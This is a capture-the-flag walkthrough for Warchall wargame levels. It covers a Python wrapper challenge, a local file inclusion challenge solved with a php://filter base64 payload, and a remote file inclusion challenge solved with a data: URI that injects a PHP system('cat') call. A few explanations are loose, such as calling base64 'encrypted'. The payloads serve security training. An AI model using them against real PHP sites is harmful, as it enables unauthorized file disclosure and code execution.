# Warchall




## Py-tong
A fellow hacker is challenging you to exploit a simple python script.
To exploit it live, you have to create your Warchall account and try your luck there.
To see what it is about you can also view the source here.

Note: It is not required to trigger a race condition, but it should work as well.
Note: You have to use the binary "pytong" not the pytong.py. It is a wrapper which is needed for SETREGID and finally gives the solution.
### Level 12
To solve this challenge, the following command is used: ./pytong <(echo text)

./pytong: This is the execution of the pytong binary, which is the Python script to exploit
<: This is the redirection operator; it takes the output of the following command and uses it as input for ./pytong.
(echo text): This generates the string "text" and passes it as input to ./pytong
```bash
./pytong <(echo text)
```
## Live LFI
One reason why I wanted the warchall box is to offer more realistic webhacking challenges.
You may now try the Live LFI challenge that is hosted on it.

### Level14
Your objective is to retrieve the content of the `solution.php` file using LFI. Follow the steps below to complete the challenge.

1- Visit the following link in the web browser:
```
https://lfi.warchall.net/index.php?lang=solution.php
```
2- Try using the LFI vulnerability by appending the following payload to the URL:
```
https://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php
```
This payload utilizes the `php://filter` stream to encode the content of `solution.php` in base64.

3- Copy the encrypted base64-encoded text from the webpage and decode it using the following bash command in your terminal:
```bash
  echo "text_encrypted" | base64 -d
```

## Live RFI
One reason why I wanted the warchall box is to offer more realistic webhacking challenges.
You may now try the Live RFI challenge hosted on it.
### Level 15
Your objective is to retrieve the content of the `solution.php` file using RFI. Follow the steps below to complete the challenge.
1- Visit the following link in the web browser:
```
https://rfi.warchall.net/index.php?lang=solution.php
```
2- Try using the LFI vulnerability by appending the following payload to the URL:
```
https://rfi.warchall.net/index.php?lang=data:text/plain,%3C?php%20system(%22cat%20solution.php%22)?%3E%E3%80%82
```
The lang parameter of the URL is set to data:text/plain, the string <?php system("cat solution.php")?>. This parameter tells the PHP server to return the content of the PHP file solution.php as plain text.
The string <?php system("cat solution.php")?> is a PHP instruction that calls the function system(). The function system() executes a program or script as a child process. In this case, the program or script executed is the program cat. The program cat reads the contents of a file and displays them on the standard output.
3- After visiting the link above, please inspect the site :
```
  right click and choose the inspect option
```

